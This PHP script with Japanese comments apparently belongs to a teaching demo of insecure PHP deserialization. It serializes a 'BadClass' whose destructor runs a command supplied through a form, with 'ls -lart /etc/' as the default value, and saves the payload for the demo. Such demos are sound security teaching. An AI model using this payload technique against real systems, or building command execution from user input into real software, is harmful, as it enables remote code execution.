<?php
/**
 * シリアライズデータを作るためのスクリプト
 * 
 * シリアライズするクラスは、NormalClassかBadClassを選べる
 * BadClassはデストラクタで$this->cmdを実行しているので、「dir c:\Windows」などの実行結果を見せても良いOSコマンドを指定して作っておく
 * 
 * このフォルダに、それぞれの作成済みのシリアルデータを置いてあるので、それをデモに使用しても良い。settings.phpのファイルパスを確認し、そこに配置する。
 * 
 * 参考
 * （解説）
 * https://thehackerish.com/insecure-deserialization-explained-with-examples/
 * （ソースコード）
 * https://gist.github.com/thehackerish/f6980b784dce2d4c86ef2d45dceaedf5#file-php-object-injection-example-deserialize-php
 */

include_once __DIR__.'/../settings.php';
include_once __DIR__.'/_include.inc';

if(isset($_POST['stype'])){
	$type = $_POST['stype'];
	$obj = null;
	$filename = "";
	if($type=="BadClass"){
		$obj = new BadClass($_POST['cmd'], $_POST['name']);
		$filename = SERIAL_FILE_BAD;
	}else{
		$obj = new NormalClass($_POST['cmd'], $_POST['name']);
		$filename = SERIAL_FILE_NORMAL;
	}
	$b =serialize($obj);
	file_put_contents($filename, $b);
	
	echo "データをシリアライズしてファイルに保存しました<br>";
	echo "<span style='background-color:#CCCCCC'>".$b."</span>";
	
	//BadClassのデストラクタの出力を隠したい
	ob_start();
	$obj = null;
	ob_end_clean();
}else{
?>

<form method="post">
コマンド：
<input type="text" name="cmd" value="ls -lart /etc/">
<br>
名前：
<input type="text" name="name">
<br>
<label><input type="radio" name="stype" value="NormalClass">NormalClass</label>
<label><input type="radio" name="stype" value="BadClass">BadClass</label>
<br>
<input type="submit" value="シリアライズ">
</form>
<?php 
}
?>
